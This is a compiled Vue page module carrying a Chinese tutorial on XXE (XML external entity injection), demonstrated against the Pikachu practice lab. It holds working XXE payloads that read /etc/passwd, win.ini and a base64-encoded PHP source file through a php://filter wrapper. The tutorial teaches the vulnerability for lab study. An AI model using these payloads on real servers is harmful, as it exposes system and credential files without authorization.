import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as t,c as n,e as i}from"./app-c90f8518.js";const s="/assets/2054866-20200927221835527-120126346-707225b8.png",l="/assets/2054866-20200927222358667-2001801420-144bad8c.png",a="/assets/2054866-20200927222741070-597655972-d1316afd.png",d="/assets/image-20230919150732435-9c0aaaf9.png",r="/assets/image-20230919150101123-df47e7c6.png",o={},m=i(`<h1 id="xxe漏洞介绍" tabindex="-1"><a class="header-anchor" href="#xxe漏洞介绍" aria-hidden="true">#</a> XXE漏洞介绍</h1><p>XXE -&quot;xml external entity injection&quot; 既&quot;xml外部实体注入漏洞&quot;。 概括一下就是&quot;攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题&quot; 也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p><p>xml是一种可拓展的标记语言，可以用来存储数据，例如：我们经常看到一些.xml的文件；它还可以用来传输数据，我们可以直接将数据以xml的格式放在请求当中，发给服务器。</p><p><strong>第一部分：XML声明部分</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot;?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>第二部分：文档类型定义 DTD</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;!DOCTYPE note[
&lt;!--定义此文档是note类型的文档--&gt;
&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;
&lt;!--外部实体声明--&gt;
]&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>第三部分：文档元素</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;note&gt;
&lt;to&gt;Dave&lt;/to&gt;
&lt;from&gt;Tom&lt;/from&gt;

&lt;head&gt;Reminder&lt;/head&gt;

&lt;body&gt;You are a good man&lt;/body&gt;
&lt;/note&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>DTD</strong>（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部.</p><p>DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞**。**</p><p><strong>内部申明DTD格式</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;!DOCTYPE 根元素 [元素申明]&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>外部引用DTD格式</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD的URI&quot;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>引用公共DTD格式</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD标识名&quot; &quot;公共DTD的URI&quot;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>外部实体例</strong></p><p><strong>外部实体引用 Payload</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY[
&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>外部引用可以支持http，file，ftp等协议。</p><p><strong>如果一个接口支持接收xm|数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞</strong></p><p>simplexml_load_string()</p><p>函数转换形式良好的XML 字符串为 <strong>SimpleXMLElement</strong> 对象。</p><p>在PHP 里面解析 xml 用的是 libxml, 其在 2.9.0 的版本中 默认是禁止解析 xml 外部实体内容的。</p><p><strong>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML</strong></p><h1 id="xxe漏洞演示" tabindex="-1"><a class="header-anchor" href="#xxe漏洞演示" aria-hidden="true">#</a> XXE漏洞演示</h1><p>打开pikachu的xxe，我们先查看他的后端代码，我们可以看到他是通过post请求来获取到前端的xml数据，然后直接给simplexml_load_string()函数进行解析，然后将解析的数据再返回到前端</p><p>[<img src="`+s+`" alt="img"></p><p>接着我们在pikachu中用一段正常的xml来测试一下</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [
    &lt;!ENTITY hacker &quot;XXE hahaha&quot;&gt;
]&gt;
&lt;name&gt;&amp;hacker;&lt;/name&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>[<img src="`+l+`" alt="img"></p><p>可以看到直接将我们DTD中的值给返回了</p><p>接这我们来构造一个恶意的payload，通过外部实体引用从而去获取后台服务器的本地文件信息(注：外部引用可以支持http，file，ftp等协议。)</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;file://etc/passwd&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>点击提交后，可以看到将指定文件给读取出来了</p><p>[<img src="`+a+`" alt="img"></p><p><strong>正常读php文件</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;
&lt;!DOCTYPE a[
        &lt;!ENTITY xxe SYSTEM &#39;file:///c:windows/win.ini&#39;&gt;		//&#39;c:/windows/win.ini&#39;也行
]&gt;

&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+d+`" alt="image-20230919150732435"></p><p><strong>编码读php文件</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;
&lt;!DOCTYPE a[
        &lt;!ENTITY xxe SYSTEM &#39;php://filter/read=convert.base64-encode/resource=d:/phpstudy_pro/WWW/1.php&#39;&gt;
]&gt;

&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+r+'" alt="image-20230919150101123"></p><p>总结：后端在接收xml数据时，开启了外部实体解析，而且也没对传来的数据做任何的过滤等安全措施。</p>',44),c=[m];function u(g,v){return t(),n("div",null,c)}const b=e(o,[["render",u],["__file","XXE漏洞.html.vue"]]);export{b as default};
